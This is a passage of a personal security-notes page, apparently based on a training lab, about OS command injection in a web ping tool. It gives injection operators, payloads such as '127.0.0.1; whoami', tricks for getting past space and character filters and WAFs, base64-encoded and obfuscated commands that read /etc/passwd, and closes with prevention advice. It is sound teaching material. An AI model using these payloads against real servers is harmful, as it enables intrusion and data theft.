+<p><img src="../../../../images/command_injection1.png" alt="Host Checker" /></p>
+<p>You can try entering the localhost IP <code>127.0.0.1</code> to check the functionality, and it returns the output of the <code>ping</code> command telling you that the localhost is alive.</p>
+<p><img src="../../../../images/command_injection2.png" alt="Localhost alive" /></p>
+<p>You can confidently guess that the IP you entered is going into a <code>ping</code> command since the output you receive suggests that. The command used may be:</p>
+<pre><code class="language-bash">ping -c 1 OUR_INPUT
+</code></pre>
+<p>If your code is not sanitized and escaped before it is used with the <code>ping</code> command, you may be able to inject another arbitrary command.</p>
+<h3 id="command-injection-methods"><a class="header" href="#command-injection-methods">Command Injection Methods</a></h3>
+<p>To inject an additional command to the intended one:</p>
+<div class="table-wrapper"><table><thead><tr><th>Injection Operator</th><th>Injection Character</th><th>URL-Encoded Character</th><th>Executed Command</th></tr></thead><tbody>
+<tr><td>Semicolon</td><td><code>;</code></td><td>%3b</td><td>Both</td></tr>
+<tr><td>New Line</td><td><code>\n</code></td><td>%0a</td><td>Both</td></tr>
+<tr><td>Background</td><td><code>&amp;</code></td><td>%26</td><td>Both (<em>second output generally shown first</em>)</td></tr>
+<tr><td>Pipe</td><td><code>|</code></td><td>%7c</td><td>Both (<em>only second output is shown</em>)</td></tr>
+<tr><td>AND</td><td><code>&amp;&amp;</code></td><td>%26%26</td><td>Both (<em>only if first succeeds</em>)</td></tr>
+<tr><td>OR</td><td><code>||</code></td><td>%7c%7c</td><td>Second (<em>only if first fails</em>)</td></tr>
+<tr><td>Sub-Shell</td><td><code>``</code></td><td>%60%60</td><td>Both (<em>Linux-only</em>)</td></tr>
+<tr><td>Sub-Shell</td><td><code>$()</code></td><td>%24%28%29</td><td>Both (<em>Linux-only</em>)</td></tr>
+</tbody></table>
+</div><div class="mdbook-callouts mdbook-callouts-tip">
+<p class="mdbook-callouts-title">
+  <span class="mdbook-callouts-icon"></span>
+  tip
+</p>
+<p>While expressions like <code>%20</code> might work when used in URLs, you may face problems when you try to use it inside commands which execute the command directly inside a shell context.<br>Inside shells you can use <code>\x20</code>, which is the hexadecimal escape sequence for a space.<br><code>bash "$(printf 'cat\x20/flag.txt')"</code> will execute <code>cat /flag.txt</code>.<br><br><a href="https://ascii.cl/htmlcodes.htm">HTML Codes</a><br><a href="https://gist.github.com/ConnerWill/d4b6c776b509add763e17f9f113fd25b">ANSI Escape Sequences</a></p>
+</div>
+<p>You can use any of these operators to inject another command so both or either of the commands get executed. You would</p>
+<ol>
+<li>write your expected input,</li>
+<li>use any of these above operators, and then</li>
+<li>write your new command.</li>
+</ol>
+<h2 id="injecting-commands"><a class="header" href="#injecting-commands">Injecting Commands</a></h2>
+<h3 id="injecting-your-command"><a class="header" href="#injecting-your-command">Injecting your Command</a></h3>
+<p>You can add a semi-colon after you IP and then append your command, such that the final payload you will use is <code>127.0.0.1; whoami</code>, and the final command to be executed would be:</p>
+<pre><code class="language-bash">ping -c 1 127.0.0.1; whoami
+</code></pre>
+<div class="mdbook-callouts mdbook-callouts-note">
+<p class="mdbook-callouts-title">
+  <span class="mdbook-callouts-icon"></span>
+  note
+</p>
+<p>A potential error can be user input validation happening on the front-end.</p>
+</div>
+<h3 id="bypassing-front-end-validation"><a class="header" href="#bypassing-front-end-validation">Bypassing Front-End Validation</a></h3>
+<p>The easiest method to customize the HTTP requests being sent to the back-end server is to use a web proxy that can intercept the HTTP requests being sent by the application.</p>
+<p><img src="../../../../images/command_injection3.png" alt="Burp" /></p>
+<h2 id="other-injection-operators"><a class="header" href="#other-injection-operators">Other Injection Operators</a></h2>
+<h3 id="and-operator"><a class="header" href="#and-operator">AND Operator</a></h3>
+<p>You can start with the AND (<em>&amp;&amp;</em>) operator, such that your final payload would be <code>127.0.0.1 &amp;&amp; whoami</code>, and the final executed command would be:</p>
+<pre><code class="language-bash">ping -c 1 127.0.0.1 &amp;&amp; whoami
+</code></pre>
+<p>The command runs, and you get the same output (<em>ping-statistics and www-data</em>).</p>
+<h3 id="or-operator"><a class="header" href="#or-operator">OR Operator</a></h3>
+<p>The OR operator only executes the second command if the first command fails to execute. This may be useful in cases where your injection would break the original command without having a solid way of having both commands work.</p>
+<pre><code class="language-bash">21y4d@htb[/htb]$ ping -c 1 127.0.0.1 || whoami
+
+PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
+64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.635 ms
+
+--- 127.0.0.1 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 0.635/0.635/0.635/0.000 ms
+</code></pre>
+<p>Only the first command would execute. This is because of how bash commands work. As the first command returns exit code <code>0</code> indicating successful execution, the bash command stops and does not try the other command. It would only attempt to execute the other command if the first command failed and returned an exit code <code>1</code>.</p>
+<p>By intentionally breaking the first command by not supplying an IP directly using the <code>\|\|</code> operator, such that the ping command would fail and your injected command gets executed.</p>
+<pre><code class="language-bash">21y4d@htb[/htb]$ ping -c 1 || whoami
+
+ping: usage error: Destination address required
+21y4d
+</code></pre>
+<h2 id="identifying-filters"><a class="header" href="#identifying-filters">Identifying Filters</a></h2>
+<h3 id="filterwaf-detection"><a class="header" href="#filterwaf-detection">Filter/WAF Detection</a></h3>
+<p><img src="../../../../images/command_injection4.png" alt="Filter" /></p>
+<p>This indicates that something you sent triggered a security mechanism in place that denied your request. This error message can be displayed in various ways. In this case, you see it in the field where the output is displayed, meaning that is was detected and prevented by the PHP web application itself. If the error message displayed a different page, with information like your IP and your request, this may indicate that it was denied by a WAF.</p>
+<h3 id="blacklisted-characters"><a class="header" href="#blacklisted-characters">Blacklisted Characters</a></h3>
+<p>A web application may have a list of blacklisted characters, and if the command contains them, it would deny the request. The PHP code may look something like this:</p>
+<pre><code class="language-php">$blacklist = ['&amp;', '|', ';', ...SNIP...];
+foreach ($blacklist as $character) {
+    if (strpos($_POST['ip'], $character) !== false) {
+        echo "Invalid input";
+    }
+}
+</code></pre>
+<p>If any character in the string you sent matches a character in the blacklist, your request is denied.</p>
+<h4 id="identifying-blacklisted-character"><a class="header" href="#identifying-blacklisted-character">Identifying Blacklisted Character</a></h4>
+<p>One way to identify a blackliste character is to just reduce the command part by part. If you can clearly say, that it's the injection operator which is blacklisted, you should start trying other operators</p>
+<p><img src="../../../../images/command_injection5.png" alt="blacklist" /></p>
+<div class="mdbook-callouts mdbook-callouts-note">
+<p class="mdbook-callouts-title">
+  <span class="mdbook-callouts-icon"></span>
+  note
+</p>
+<p>The new-line character is usually not blacklisted, as it may be needed in the payload itseld. It in appending your commands both in Linux and Windows.</p>
+</div>
+<h2 id="bypassing-space-filters"><a class="header" href="#bypassing-space-filters">Bypassing Space Filters</a></h2>
+<p>A space is a common blacklisted character, especially if the input should not contain any spaces, like an IP. Still, there are many ways to add a space character without actually using the space character.</p>
+<p><img src="../../../../images/command_injection6.png" alt="Space filter" /></p>
+<h3 id="using-tabs"><a class="header" href="#using-tabs">Using Tabs</a></h3>
+<p>Using Tabs (<em>%09</em>) instead of spaces is a technique that may work, as both Linux and Windows accept commands with tabs between arguments, and they are executed the same.</p>
+<p><img src="../../../../images/command_injection7.png" alt="tab" /></p>
+<h3 id="using-ifs"><a class="header" href="#using-ifs">Using $IFS</a></h3>
+<div class="mdbook-callouts mdbook-callouts-note">
+<p class="mdbook-callouts-title">
+  <span class="mdbook-callouts-icon"></span>
+  note
+</p>
+<p>"The special shell variable <em>IFS</em> determines how Bash recognizes word boundaries while splitting a sequence of character strings."</p>
+</div>
+<p>Using the ($IFS) Linux Environment Variable may also work since its default value is a space and a tab, which would work between command arguments. So, if you use <code>${IFS}</code> where the spaces should be, the variable should be automatically replaced with a space, and your command should work.</p>
+<p><img src="../../../../images/command_injection8.png" alt="ifs" /></p>
+<h3 id="using-brace-expansion"><a class="header" href="#using-brace-expansion">Using Brace Expansion</a></h3>
+<p>... which automatically adds spaces between arguments wrapped between braces.</p>
+<p>Payload example:</p>
+<pre><code class="language-bash">127.0.0.1%0a{ls,-la}
+</code></pre>
+<p>Bash example:</p>
+<pre><code class="language-bash">d41y@htb[/htb]$ {ls,-la}
+
+total 0
+drwxr-xr-x 1 21y4d 21y4d   0 Jul 13 07:37 .
+drwxr-xr-x 1 21y4d 21y4d   0 Jul 13 13:01 ..
+</code></pre>
+<h2 id="bypassing-other-blacklisted-characters"><a class="header" href="#bypassing-other-blacklisted-characters">Bypassing Other Blacklisted Characters</a></h2>
+<p>A very commonly blacklisted character is the slash (<code>/</code>) or backslash (<code>\</code>) character, as it is necessary to specify directories in Linux or Windows.</p>
+<h3 id="linux"><a class="header" href="#linux">Linux</a></h3>
+<p>One technique you can use for replacing slashes is through Linux Environment Variables. While <code>${IFS}</code> is directly replaced with a space, there's no such environment variable for slashes or semi-colons. However, these characters may be used in an environment variable, and you can specify start and length of your string to exactly match this character.</p>
+<pre><code class="language-bash">d41y@htb[/htb]$ echo ${PATH}
+
+/usr/local/bin:/usr/bin:/bin:/usr/games
+
+...
+
+d41y@htb[/htb]$ echo ${PATH:0:1}
+
+/
+
+...
+
+d41y@htb[/htb]$ echo ${LS_COLORS:10:1}
+
+;
+</code></pre>
+<p><img src="../../../../images/command_injection9.png" alt="env" /></p>
+<h3 id="windows"><a class="header" href="#windows">Windows</a></h3>
+<p>The same concept works on Windows as well. To produce a slash in CMD, you can echo a Windows variable (e.g. <code>%HOMEPATH%</code>), and then specify a starting position, and finally specifying a negative end position.</p>
+<p>For <code>%HOMEPATH%</code> -&gt; <code>\User\htb-student</code>:</p>
+<pre><code class="language-cmd">C:\htb&gt; echo %HOMEPATH:~6,-11%
+
+\
+</code></pre>
+<p>It also works on Powershell using the same variables. With Powershell, a word is considered an array, so you have to specify the index of the character you need. As you only need one character, you don't have to specify the start and end positions:</p>
+<pre><code class="language-powershell">PS C:\htb&gt; $env:HOMEPATH[0]
+
+\
+
+
+PS C:\htb&gt; $env:PROGRAMFILES[10]
+PS C:\htb&gt;
+</code></pre>
+<div class="mdbook-callouts mdbook-callouts-note">
+<p class="mdbook-callouts-title">
+  <span class="mdbook-callouts-icon"></span>
+  note
+</p>
+<p>Use <code>Get-ChildItem Env:</code> to print all environment variables and then pick one of them to produce a character you need.</p>
+</div>
+<h3 id="character-shifting"><a class="header" href="#character-shifting">Character Shifting</a></h3>
+<p>The following Linux command shifts the character you pass by 1. So, all you have to do is find the character in the ASCII table that is just before your needed character (<em><code>man ascii</code> to get the position</em>), then add it instead of <code>[</code> in the below example.</p>
+<pre><code class="language-bash">d41y@htb[/htb]$ man ascii     # \ is on 92, before it is [ on 91
+d41y@htb[/htb]$ echo $(tr '!-}' '"-~'&lt;&lt;&lt;[)
+
+\
+</code></pre>
+<h2 id="bypassing-blacklisted-commands"><a class="header" href="#bypassing-blacklisted-commands">Bypassing Blacklisted Commands</a></h2>
+<h3 id="commands-blacklist"><a class="header" href="#commands-blacklist">Commands Blacklist</a></h3>
+<p>A basic command blacklist filter in PHP would look like this:</p>
+<pre><code class="language-php">$blacklist = ['whoami', 'cat', ...SNIP...];
+foreach ($blacklist as $word) {
+    if (strpos('$_POST['ip']', $word) !== false) {
+        echo "Invalid input";
+    }
+}
+</code></pre>
+<p>It is checking each word of the user input to see if it matches any of the blacklisted words. However, this code is looking for an exact match of the provided command, so if you send a slightly different command, it may not get blocked.</p>
+<h3 id="linux--windows"><a class="header" href="#linux--windows">Linux &amp; Windows</a></h3>
+<p>One very common and easy obfuscation technique is inserting certain characters within your command that are usually ignored by command shells like Bash or Powershell and will execute the same command as if they were not there. Some are <code>'</code> or <code>"</code>.</p>
+<pre><code class="language-bash">21y4d@htb[/htb]$ w'h'o'am'i
+
+21y4d
+
+...
+
+21y4d@htb[/htb]$ w"h"o"am"i
+
+21y4d
+</code></pre>
+<div class="mdbook-callouts mdbook-callouts-caution">
+<p class="mdbook-callouts-title">
+  <span class="mdbook-callouts-icon"></span>
+  caution
+</p>
+<p>You cannot mix types of quotes and the number of qoutes must be even.</p>
+</div>
+<h3 id="linux-only"><a class="header" href="#linux-only">Linux Only</a></h3>
+<p>There are some other Linux-only chars that you can use in the middle of commands, which the Bash shell will ignore. These are <code>\</code> and <code>$@</code>. It works exactly as id did with the quotes, the number of chars do not have to be even.</p>
+<pre><code class="language-bash">who$@ami
+w\ho\am\i
+</code></pre>
+<h3 id="windows-only"><a class="header" href="#windows-only">Windows Only</a></h3>
+<p>There are also some Windows-only chars you can insert in the middle of commands that do not affect the outcome, like a <code>^</code>.</p>
+<pre><code class="language-powershell">C:\htb&gt; who^ami
+
+21y4d
+</code></pre>
+<h2 id="advanced-command-obfuscation"><a class="header" href="#advanced-command-obfuscation">Advanced Command Obfuscation</a></h2>
+<p>In some instances there are advanced filtering solutions, like WAF, and basic evasion techniques may not necessarily work.</p>
+<h3 id="case-manipulation"><a class="header" href="#case-manipulation">Case Manipulation</a></h3>
+<p>One command obfuscation technique is case manipulation, like inverting the character cases of a command or alternating between cases. This usually works because a command blacklist may not check for different case variations of a single word, as Linux systems are case-sensitive.</p>
+<pre><code class="language-bash">21y4d@htb[/htb]$ $(tr "[A-Z]" "[a-z]"&lt;&lt;&lt;"WhOaMi")
+
+21y4d
+</code></pre>
+<div class="mdbook-callouts mdbook-callouts-note">
+<p class="mdbook-callouts-title">
+  <span class="mdbook-callouts-icon"></span>
+  note
+</p>
+<p>This command uses <code>tr</code> to replace all upper-case chars with lower-case chars, which results in all lower-case chars command.</p>
+</div>
+<p>In Microsoft, you can change the casing of the characters of the command and send it. Commands for Powershell are case-insensitive, meaning they will execute the command regardless of what case it is written in:</p>
+<pre><code class="language-Powershell">PS C:\htb&gt; WhOaMi
+
+21y4d
+</code></pre>
+<h3 id="reversed-commands"><a class="header" href="#reversed-commands">Reversed Commands</a></h3>
+<h4 id="linux-1"><a class="header" href="#linux-1">Linux</a></h4>
+<p>Another command obfuscation technique is reversing commands and having a command template that switches them back and executes them in real-time.</p>
+<pre><code class="language-bash">d41y@htb[/htb]$ echo 'whoami' | rev
+imaohw
+</code></pre>
+<p>Then, you can execute the original command by reversing it back in a sub-shell <code>$()</code>:</p>
+<pre><code class="language-bash">21y4d@htb[/htb]$ $(rev&lt;&lt;&lt;'imaohw')
+
+21y4d
+</code></pre>
+<h4 id="windows-1"><a class="header" href="#windows-1">Windows</a></h4>
+<p>The same can applied in Windows.</p>
+<pre><code class="language-powershell">PS C:\htb&gt; "whoami"[-1..-20] -join ''
+
+imaohw
+</code></pre>
+<p>Powershell sub-shell:</p>
+<pre><code class="language-powershell">PS C:\htb&gt; iex "$('imaohw'[-1..-20] -join '')"
+
+21y4d
+</code></pre>
+<h3 id="encoded-commands"><a class="header" href="#encoded-commands">Encoded Commands</a></h3>
+<p>... are helpful for commands containing filtered characters or characters that may be URL-decoded by the server. This may allow for the command to get messed up by the time it reaches the shell and eventually fails to execute. Instead of copying an existing command online, you will try to create your own unique obfuscation command this time. This way, it is much less likely to be denied by a filter or a WAF. The command you create will be unique to each case, depending on what chars are allowed and the level of security of the server.</p>
+<h4 id="linux-2"><a class="header" href="#linux-2">Linux</a></h4>
+<p>You can utilize various encoding tools, like <code>base64</code> or <code>xxd</code>.</p>
+<pre><code class="language-bash">d41y@htb[/htb]$ echo -n 'cat /etc/passwd | grep 33' | base64
+
+Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==
+</code></pre>
+<p>Now you can create a command that will decode the encoded string in a sub-shell, and then pass it to Bash to be executed.</p>
+<pre><code class="language-bash">d41y@htb[/htb]$ bash&lt;&lt;&lt;$(base64 -d&lt;&lt;&lt;Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
+
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+</code></pre>
+<h4 id="windows-2"><a class="header" href="#windows-2">Windows</a></h4>
+<p>You can use the same technique with Windows as well:</p>
+<pre><code class="language-powershell">PS C:\htb&gt; [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))
+
+dwBoAG8AYQBtAGkA
+</code></pre>
+<p>And:</p>
+<pre><code class="language-powershell">PS C:\htb&gt; iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"
+
+21y4d
+</code></pre>
+<h2 id="evasion-tools"><a class="header" href="#evasion-tools">Evasion Tools</a></h2>
+<p>If you are dealing with advanced security tools, you may not be able to use basic, manual obfuscation techniques. In such cases, it may be best to resort to automated obfuscation tools.</p>
+<h3 id="linux-bashfuscator"><a class="header" href="#linux-bashfuscator">Linux (<a href="https://github.com/Bashfuscator/Bashfuscator">Bashfuscator</a>)</a></h3>
+<pre><code class="language-bash">d41y@htb[/htb]$ ./bashfuscator -h
+
+usage: bashfuscator [-h] [-l] ...SNIP...
+
+optional arguments:
+  -h, --help            show this help message and exit
+
+Program Options:
+  -l, --list            List all the available obfuscators, compressors, and encoders
+  -c COMMAND, --command COMMAND
+                        Command to obfuscate
+...SNIP...
+</code></pre>
+<p>You can start by providing the command you want to obfuscate with the <code>-c</code> flag.</p>
+<pre><code class="language-bash">d41y@htb[/htb]$ ./bashfuscator -c 'cat /etc/passwd'
+
+[+] Mutators used: Token/ForCode -&gt; Command/Reverse
+[+] Payload:
+ ${*/+27\[X\(} ...SNIP...  ${*~}   
+[+] Payload size: 1664 characters
+</code></pre>
+<p>However, running the tool this way will randomly pick an obfuscation technique, which can output a command length ranging from a few hundred chars to over a million chars. You can use some of the flags from the help menu to produce a shorter and simpler obfuscated command.</p>
+<pre><code class="language-bash">d41y@htb[/htb]$ ./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1
+
+[+] Mutators used: Token/ForCode
+[+] Payload:
+eval "$(W0=(w \  t e c p s a \/ d);for Ll in 4 7 2 1 8 3 2 4 8 5 7 6 6 0 9;{ printf %s "${W0[$Ll]}";};)"
+[+] Payload size: 104 characters
+</code></pre>
+<p>To test it:</p>
+<pre><code class="language-bash">d41y@htb[/htb]$ bash -c 'eval "$(W0=(w \  t e c p s a \/ d);for Ll in 4 7 2 1 8 3 2 4 8 5 7 6 6 0 9;{ printf %s "${W0[$Ll]}";};)"'
+
+root:x:0:0:root:/root:/bin/bash
+...SNIP...
+</code></pre>
+<h3 id="windows-dosfucation"><a class="header" href="#windows-dosfucation">Windows (<a href="https://github.com/danielbohannon/Invoke-DOSfuscation">DOSfucation</a>)</a></h3>
+<p>There is also a very similar tool you can use for Windows. This is an interactive tool, as you run it once and interact with it to get the desired obfucated command.</p>
+<pre><code class="language-powershell">PS C:\htb&gt; Invoke-DOSfuscation
+Invoke-DOSfuscation&gt; help
+
+HELP MENU :: Available options shown below:
+[*]  Tutorial of how to use this tool             TUTORIAL
+...SNIP...
+
+Choose one of the below options:
+[*] BINARY      Obfuscated binary syntax for cmd.exe &amp; powershell.exe
+[*] ENCODING    Environment variable encoding
+[*] PAYLOAD     Obfuscated payload via DOSfuscation
+</code></pre>
+<p>You can start using the tool, as follows:</p>
+<pre><code class="language-powershell">Invoke-DOSfuscation&gt; SET COMMAND type C:\Users\htb-student\Desktop\flag.txt
+Invoke-DOSfuscation&gt; encoding
+Invoke-DOSfuscation\Encoding&gt; 1
+
+...SNIP...
+Result:
+typ%TEMP:~-3,-2% %CommonProgramFiles:~17,-11%:\Users\h%TMP:~-13,-12%b-stu%SystemRoot:~-4,-3%ent%TMP:~-19,-18%%ALLUSERSPROFILE:~-4,-3%esktop\flag.%TMP:~-13,-12%xt
+</code></pre>
+<p>To test it:</p>
+<pre><code class="language-powershell">C:\htb&gt; typ%TEMP:~-3,-2% %CommonProgramFiles:~17,-11%:\Users\h%TMP:~-13,-12%b-stu%SystemRoot:~-4,-3%ent%TMP:~-19,-18%%ALLUSERSPROFILE:~-4,-3%esktop\flag.%TMP:~-13,-12%xt
+
+test_flag
+</code></pre>
+<h2 id="command-injection-prevention"><a class="header" href="#command-injection-prevention">Command Injection Prevention</a></h2>
+<h3 id="system-commands"><a class="header" href="#system-commands">System Commands</a></h3>
+<p>You should always avoid using functions that execute system commands, especially if you are using user input with them. Even when you aren't directly inputting user input into these functions, a user may be able to indirectly influence them, which may lead to a command injection vulnerability.</p>
+<p>Instead of using system command execution functions, you should use built-in functions that perform the needed funtionality, as back-end languages usually have secure implementations of these types of functionalities.</p>
+<p>If you needed to execute a system command, and no built-in function can be found to perform the same functionality, you should never directly use the user input with these functions but should always validate and sanitize the user input on the back-end. Furthermore, you should try to limit your use of these type if functions as much as possible and only use them when there's no built-in alternative to the functionality you require.</p>
+<h3 id="input-validation"><a class="header" href="#input-validation">Input Validation</a></h3>
+<p>Input validition is done to ensure it matches the expected format for the input, such that the request is denied if it does not match.</p>
+<p>In PHP, like many other webdev languages, there are built in filters for a variety of standard formats, like emails, URLs, and even IPs, which can be used with the <code>filter_var</code> function:</p>
+<pre><code class="language-php">if (filter_var($_GET['ip'], FILTER_VALIDATE_IP)) {
+    // call function
+} else {
+    // deny request
+}
+</code></pre>
+<p>If you wanted to validate a different non-standard format, then you can use a RegEx with the <code>preg_match</code> function. The same can be achieved with JavaScript for both the front-end and back-end.</p>
+<pre><code class="language-php">if(/^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/.test(ip)){
+    // call function
+}
+else{
+    // deny request
+}
+</code></pre>
+<h3 id="input-sanitization"><a class="header" href="#input-sanitization">Input Sanitization</a></h3>
+<p>The most critical part for preventing any injection vuln is input sanitization, which means removing any non-necessary special chars from the user input. Input sanitization is always performed after input validation. Even after you validated that the provided user input is in the proper format, you should still perform sanitization and remove any special chars not required for the specific format, as there are cases where input validation may fail.</p>
+<p>In the example code, you saw that when you were dealing with character and command filters, it was blacklisting certain words and looking for them in the user input. Generally, this is not a good enough approach to preventing injections, and you should use built-in functions to remove any special characters. You can use <code>preg_replace</code> to remove any special chars from the user input.</p>
+<pre><code class="language-php">$ip = preg_replace('/[^A-Za-z0-9.]/', '', $_GET['ip']);
+</code></pre>
+<p>The same can be done with JavaScript:</p>
+<pre><code class="language-javascript">var ip = ip.replace(/[^A-Za-z0-9.]/g, '');
+</code></pre>
+<h3 id="server-configuration"><a class="header" href="#server-configuration">Server Configuration</a></h3>
+<p>You should make sure that your back-end server is securely configured to reduce the impact in the event that the webserver is compromised. Some configurations you may implement are:</p>
+<ul>
+<li>Use the web server's built-in WAF</li>
+<li>Abide by the <a href="https://en.wikipedia.org/wiki/Principle_of_least_privilege">Principle of Least Privilege</a> by running the web server as a low privileged user</li>
+<li>Prevent certain functions from being executed by the web server</li>
+<li>Limit the scope accessible by the web application to its folder</li>
+<li>Reject double-encoded requests and non-ASCII chars in URLs</li>
+<li>Avoid the use of sensitive/outdated libraries and modules<!-- {% embed footer message="2025 • Created by [d41y](https://github.com/d41y)" %} --></li>
+</ul>
+<div data-embedify data-app="footer" data-option-message="2025 • Created by [d41y](https://github.com/d41y)" style="display:none"></div>
+<style>footer { text-align: center; text-wrap: balance; margin-top: 5rem; display: flex; flex-direction: column; justify-content: center; align-items: center; } footer p { margin: 0; }</style><footer><p>2025 • Created by <a href="https://github.com/d41y">d41y</a></p></footer>
+                    </main>
+
+                    <nav class="nav-wrapper" aria-label="Page navigation">
+                        <!-- Mobile navigation buttons -->
+                            <a rel="prev" href="../../../../attack/web/web_attacks/injection_attacks/index.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                                <i class="fa fa-angle-left"></i>
+                            </a>
+
+                            <a rel="next prefetch" href="../../../../attack/web/web_attacks/injection_attacks/sqli.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                                <i class="fa fa-angle-right"></i>
+                            </a>
+
+                        <div style="clear: both"></div>
+                    </nav>
+                </div>
+            </div>
+
+            <nav class="nav-wide-wrapper" aria-label="Page navigation">
+                    <a rel="prev" href="../../../../attack/web/web_attacks/injection_attacks/index.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                        <i class="fa fa-angle-left"></i>
+                    </a>
+
+                    <a rel="next prefetch" href="../../../../attack/web/web_attacks/injection_attacks/sqli.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                        <i class="fa fa-angle-right"></i>
+                    </a>
+            </nav>
+
+        </div>
+
+        <!-- Livereload script (if served using the cli tool) -->
+        <script>
+            const wsProtocol = location.protocol === 'https:' ? 'wss:' : 'ws:';
+            const wsAddress = wsProtocol + "//" + location.host + "/" + "__livereload";
+            const socket = new WebSocket(wsAddress);
+            socket.onmessage = function (event) {
+                if (event.data === "reload") {
+                    socket.close();
+                    location.reload();
+                }
+            };
+
+            window.onbeforeunload = function() {
+                socket.close();
+            }
+        </script>
+
+
+
+        <script>
+            window.playground_copyable = true;
+        </script>
+
+
+        <script src="../../../../elasticlunr.min.js"></script>
+        <script src="../../../../mark.min.js"></script>
+        <script src="../../../../searcher.js"></script>
+
+        <script src="../../../../clipboard.min.js"></script>
+        <script src="../../../../highlight.js"></script>
+        <script src="../../../../book.js"></script>
+
+        <!-- Custom JS scripts -->
+        <script src="../../../../theme/pagetoc.js"></script>
+
+
+
+    </div>
+    </body>
+</html>
